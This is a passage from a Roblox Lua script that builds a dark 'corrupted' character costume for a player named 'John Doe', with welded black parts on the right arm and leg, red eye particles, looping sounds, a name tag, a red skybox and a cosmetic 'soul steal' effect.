		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999951303, -0.0010970087, 0.00981015898, 0.00110222446, 0.999999166, -0.000526388001, -0.00980970077, 0.00053719338, 0.99995172),C1 = CFrame.new(5.20944595e-005, -0.499986172, 0.399987936, 0.00980953407, -0.000537137908, -0.99994719, 0.00110225566, 1.00000858, -0.000526368851, 0.999961138, -0.00109705783, 0.00981026888),})
		ScatterEff(EffCorruptedPart)
		RightArm = New("Model",chara,"RightArm",{})
		MainPart = New("Part",RightArm,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.011096, 6.31690788, -3.92582893, 0.00918400101, -0.262283146, 0.964947343, 0.259330034, 0.932596445, 0.251021653, -0.965745091, 0.247934431, 0.0765828639),CanCollide = false,})
		Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Right Arm"],C0 = CFrame.new(0, 0, 0, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),C1 = CFrame.new(-2.86102295e-006, -9.05990601e-006, -2.38418579e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		Hitbox = New("Part",RightArm,"Hitbox",{BrickColor = BrickColor.new("Really black"),Transparency = 1,Transparency = 1,Size = Vector3.new(1, 4, 1),CFrame = CFrame.new(22.2733669, 5.0842762, -22.1737366, -0.964945257, -0.262290984, 0.00919180829, -0.251027077, 0.93259424, 0.259333313, -0.0765930116, 0.247935042, -0.965744138),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Weld = New("ManualWeld",Hitbox,"Weld",{Part0 = Hitbox,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964945257, -0.251027077, -0.0765930116, -0.262290984, 0.93259424, 0.247935042, 0.00919180829, 0.259333313, -0.965744138),C1 = CFrame.new(-1.52587891e-005, -1.00003147, -1.71661377e-005, 0.0091838371, 0.259330064, -0.965745151, -0.262283117, 0.932596445, 0.247934505, 0.964947283, 0.251021653, 0.0765827149),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.011096, 6.3169179, -3.92581391, -0.964945257, -0.262290984, 0.00919180829, -0.251027077, 0.93259424, 0.259333313, -0.0765930116, 0.247935042, -0.965744138),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964945138, -0.251027018, -0.0765930042, -0.262290984, 0.932594121, 0.247935027, 0.00919180084, 0.259333313, -0.965744197),C1 = CFrame.new(-1.1920929e-005, 1.28746033e-005, 3.57627869e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.600000024, 0.400000036),CFrame = CFrame.new(2.14866924, 6.03215551, -4.72580194, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.699988842, -0.499982834, 7.62939453e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1.20000005, 0.600000024),CFrame = CFrame.new(2.63876629, 4.02682734, -4.32773018, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(-0.199987888, -2.39999342, 3.02791595e-005, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1, 0.600000024),CFrame = CFrame.new(1.62134135, 7.81954479, -3.94021821, 0.964945078, -0.262291819, -0.00918725226, 0.251029015, 0.932593465, -0.259333432, 0.0765890032, 0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.964944899, 0.251028955, 0.0765889958, -0.262291819, 0.932593465, 0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.399995804, 1.5000124, -2.38418579e-007, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.600000024, 0.400000036),CFrame = CFrame.new(2.35483098, 5.18234444, -4.53787422, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.300010204, -1.29999256, 1.40666962e-005, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1, 0.600000024),CFrame = CFrame.new(1.88730097, 6.99068737, -4.57445002, -0.964945078, 0.262291819, -0.00918725226, -0.251029015, -0.932593465, -0.259333432, -0.0765890032, -0.247936144, 0.965744317),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("SpecialMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),MeshType = Enum.MeshType.Wedge,})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964944899, -0.251028955, -0.0765889958, 0.262291819, -0.932593465, -0.247936144, -0.00918724574, -0.259333432, 0.965744257),C1 = CFrame.new(0.799996853, 0.50001812, 4.29153442e-006, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		CorruptedPart = New("Part",RightArm,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 0.800000072, 0.600000024),CFrame = CFrame.new(2.37646794, 4.9594202, -4.07979012, -0.964945316, -0.262290984, 0.00918756705, -0.251028091, 0.932593942, 0.259333163, -0.0765890256, 0.247935995, -0.965744197),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, -0.964945138, -0.251028031, -0.0765890107, -0.262290955, 0.932593882, 0.247935966, 0.0091875596, 0.259333193, -0.965744257),C1 = CFrame.new(-0.199994564, -1.39999104, 1.52587891e-005, 0.00918400101, 0.259330034, -0.965745091, -0.262283146, 0.932596445, 0.247934431, 0.964947343, 0.251021653, 0.0765828639),})
		RightLeg = New("Model",chara,"RightLeg",{})
		MainPart = New("Part",RightLeg,"MainPart",{Transparency = 1,Transparency = 1,FormFactor = Enum.FormFactor.Symmetric,Size = Vector3.new(1, 2, 1),CFrame = CFrame.new(2.29641008, 1.31540966, 0.248092994, 0.00933599845, 0.00110999751, 0.999955773, -0.0030579993, 0.999994755, -0.00108149007, -0.99995178, -0.0030477671, 0.00933934376),CanCollide = false,BottomSurface = Enum.SurfaceType.Smooth,})
		Weld = New("ManualWeld",MainPart,"Weld",{Part0 = MainPart,Part1 = chara["Right Leg"],C0 = CFrame.new(0, 0, 0, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),C1 = CFrame.new(2.98023224e-008, -8.58306885e-006, 2.38418579e-007, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.200000003, 0.200000003),CFrame = CFrame.new(2.70045996, 1.61376095, -0.149078026, 0.999955833, 0.00111049914, -0.0093326522, -0.00108199986, 0.999994755, 0.00305823679, 0.00933599938, -0.00304800388, 0.999951839),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955893, -0.00108199986, 0.00933599938, 0.00111049926, 0.999994755, -0.00304800388, -0.0093326522, 0.00305823679, 0.99995178),C1 = CFrame.new(0.400011688, 0.300008655, 0.400000095, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(1.90071809, 1.81462395, -0.157150015, 0.999955714, 0.00111050205, -0.0093366541, -0.00108199974, 0.999994755, 0.00305724167, 0.00933999754, -0.00304700364, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111050217, 0.999994755, -0.00304700388, -0.00933665317, 0.00305724121, 0.99995178),C1 = CFrame.new(0.400002658, 0.50000751, -0.399999142, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000036, 0.200000003),CFrame = CFrame.new(1.896873, 1.71584904, 0.243133992, 0.999955714, 0.00111050205, -0.0093366541, -0.00108199974, 0.999994755, 0.00305724167, 0.00933999754, -0.00304700364, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111050217, 0.999994755, -0.00304700388, -0.00933665317, 0.00305724121, 0.99995178),C1 = CFrame.new(4.14252281e-006, 0.400008917, -0.399998784, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.800000072, 0.200000003),CFrame = CFrame.new(1.89314091, 1.71706903, 0.643112063, 0.999955714, 0.00111050205, -0.0093366541, -0.00108199974, 0.999994755, 0.00305724167, 0.00933999754, -0.00304700364, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111050217, 0.999994755, -0.00304700388, -0.00933665317, 0.00305724121, 0.99995178),C1 = CFrame.new(-0.399993181, 0.400005698, -0.399996519, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		EffCorruptedPart = New("Part",RightLeg,"EffCorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(1, 1.20000005, 1),CFrame = CFrame.new(2.29597116, 0.915416002, 0.249298006, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",EffCorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",EffCorruptedPart,"Weld",{Part0 = EffCorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(1.41263008e-005, -0.399995744, 5.00679016e-006, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(2.300596, 1.71419013, -0.153122023, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(0.400015235, 0.400005817, 7.39097595e-006, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.600000024, 0.200000003),CFrame = CFrame.new(2.69322205, 1.81620288, 0.650299072, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(-0.400013447, 0.500005245, 0.400009155, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		CorruptedPart = New("Part",RightLeg,"CorruptedPart",{BrickColor = BrickColor.new("Really black"),Material = Enum.Material.Granite,Size = Vector3.new(0.200000003, 0.400000006, 0.200000003),CFrame = CFrame.new(2.69684124, 1.71498096, 0.250625998, 0.999955714, 0.00111051137, -0.00933665317, -0.00108199974, 0.999994755, 0.00305824191, 0.00933999754, -0.00304800365, 0.999951899),CanCollide = false,BackSurface = Enum.SurfaceType.SmoothNoOutlines,BottomSurface = Enum.SurfaceType.SmoothNoOutlines,FrontSurface = Enum.SurfaceType.SmoothNoOutlines,LeftSurface = Enum.SurfaceType.SmoothNoOutlines,RightSurface = Enum.SurfaceType.SmoothNoOutlines,TopSurface = Enum.SurfaceType.SmoothNoOutlines,Color = Color3.new(0.0666667, 0.0666667, 0.0666667),})
		Mesh = New("BlockMesh",CorruptedPart,"Mesh",{Scale = Vector3.new(1.10000002, 1.10000002, 1.10000002),})
		Weld = New("ManualWeld",CorruptedPart,"Weld",{Part0 = CorruptedPart,Part1 = MainPart,C0 = CFrame.new(0, 0, 0, 0.999955773, -0.00108199974, 0.00933999848, 0.00111051148, 0.999994755, -0.00304800388, -0.00933665223, 0.00305824145, 0.99995178),C1 = CFrame.new(-1.63316727e-005, 0.400005937, 0.400005102, 0.00933599845, -0.0030579993, -0.99995178, 0.00110999751, 0.999994755, -0.0030477671, 0.999955773, -0.00108149007, 0.00933934376),})
		ScatterEff(EffCorruptedPart)
	
		sa = RightArm:GetChildren()
		for i = 1, #sa do
			ScatterEff(sa[i])
		end
	
		local eff1 = Instance.new("ParticleEmitter",EyeFire)
		eff1.Size = NumberSequence.new(.1)
		eff1.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
		eff1.LightEmission = 1
		eff1.Lifetime = NumberRange.new(.5)
		eff1.Speed = NumberRange.new(1)
		eff1.EmissionDirection = "Front"
		eff1.Rate = 100
		eff1.Texture = "rbxassetid://347504241"
		eff1.Acceleration = Vector3.new(0,10,0)
		eff1.Color = ColorSequence.new(Color3.new(1,0,0))
		local eff2 = Instance.new("ParticleEmitter",EyeFire)
		eff2.Size = NumberSequence.new(.1)
		eff2.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(.2,0),NumberSequenceKeypoint.new(1,1)})
		eff2.LightEmission = 1
		eff2.Lifetime = NumberRange.new(.5)
		eff2.Speed = NumberRange.new(1)
		eff2.EmissionDirection = "Front"
		eff2.Rate = 100
		eff2.Texture = "rbxassetid://347504259"
		eff2.Acceleration = Vector3.new(0,10,0)
		eff2.Color = ColorSequence.new(Color3.new(1,0,0))
		local eff3 = Instance.new("ParticleEmitter",EyeFire)
		eff3.Size = NumberSequence.new(.1)
		eff3.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0,0),NumberSequenceKeypoint.new(1,1)})
		eff3.LightEmission = 1
		eff3.Lifetime = NumberRange.new(.5)
		eff3.Speed = NumberRange.new(1)
		eff3.EmissionDirection = "Front"
		eff3.Rate = 100
		eff3.Texture = "rbxasset://textures/particles/fire_main.dds"
		eff3.Acceleration = Vector3.new(0,10,0)
		eff3.Color = ColorSequence.new(Color3.new(1,0,0))
	
		--Sounds--
		slashsnd = New("Sound",chara.Torso,"Slash",{SoundId = "rbxassetid://28144425",PlaybackSpeed = .7,Volume = 5})
		hitsnd = New("Sound",chara.Torso,"Hit",{SoundId = "rbxassetid://429400881",PlaybackSpeed = .7,Volume = 5})
		telesnd = New("Sound",chara.Torso,"Tele",{SoundId = "rbxassetid://2767090",PlaybackSpeed = .7,Volume = 5})
		burnsnd = New("Sound",chara.Torso,"Burn",{SoundId = "rbxassetid://32791565",PlaybackSpeed = .7,Volume = 5})
		music1 = New("Sound",chara.Torso,"Music1",{SoundId = "rbxassetid://151038517",PlaybackSpeed = .5,Volume = 10,Looped = true})
		music2 = New("Sound",chara.Torso,"Music2",{SoundId = "rbxassetid://11984351",PlaybackSpeed = .2,Volume = 5,Looped = true})
		deathmus = New("Sound",chara.Torso,"DeathMus",{SoundId = "rbxassetid://19094700",PlaybackSpeed = .5,Volume = 5,Looped = true})
		deathex = New("Sound",chara.Torso,"DeathEx",{SoundId = "rbxassetid://11984351",PlaybackSpeed = 1,Volume = 5})
		music1:Play()
		music2:Play()
	
		--Animations--
		swinganim = chara.Humanoid:LoadAnimation(New("Animation",chara,"Swing",{AnimationId = "rbxassetid://186934658"}))
	
		--Name Tag--
		local naeeym = Instance.new("BillboardGui",chara)
		naeeym.Size = UDim2.new(0,100,0,40)
		naeeym.StudsOffset = Vector3.new(0,2,0)
		naeeym.Adornee = chara.Head
		local tecks = Instance.new("TextLabel",naeeym)
		tecks.BackgroundTransparency = 1
		tecks.BorderSizePixel = 0
		tecks.Text = "John Doe"
		tecks.Font = "Fantasy"
		tecks.FontSize = "Size24"
		tecks.TextStrokeTransparency = 0
		tecks.TextStrokeColor3 = Color3.new(0,0,0)
		tecks.TextColor3 = Color3.new(0,0,0)
		tecks.Size = UDim2.new(1,0,0.5,0)
	
		--Skybox--
		skybox = Instance.new("Part",chara)
		skybox.Size = Vector3.new(0,0,0)
		skybox.Anchored = true
		skybox.CanCollide = true
		skyboxmesh = Instance.new("SpecialMesh",skybox)
		skyboxmesh.MeshId = "http://www.roblox.com/asset/?id=1527559"
		skyboxmesh.TextureId = "http://www.roblox.com/asset/?id=1529455"
		skyboxmesh.VertexColor = Vector3.new(1,0,0)
		skyboxmesh.Scale = Vector3.new(-3000,-1000,-3000)
	
		--Soul Steal--
		function SoulSteal(pos)
			local soulst = coroutine.wrap(function()
				local soul = Instance.new("Part",chara)
				soul.Size = Vector3.new(0,0,0)
				soul.CanCollide = false
				soul.Anchored = false
				soul.Position = pos
				soul.CFrame = CFrame.new(pos.X,pos.Y,pos.Z)
				soul.Transparency = 1
				local ptc = Instance.new("ParticleEmitter",soul)
				ptc.Texture = "http://www.roblox.com/asset/?id=413366101"
				ptc.Size = NumberSequence.new(.5)
				ptc.LockedToPart = true
				ptc.Speed = NumberRange.new(0)
				ptc.Lifetime = NumberRange.new(9999)
				local bodpos = Instance.new("BodyPosition",soul)
				bodpos.Position = pos
				wait(2)
				soul.Touched:connect(function(hit)
					if hit.Parent == chara then
						soul:Destroy()
					end
				end)
				while soul do
					wait(.1)
					bodpos.Position = chara.Torso.Position
				end
			end)
			soulst()
		end
	
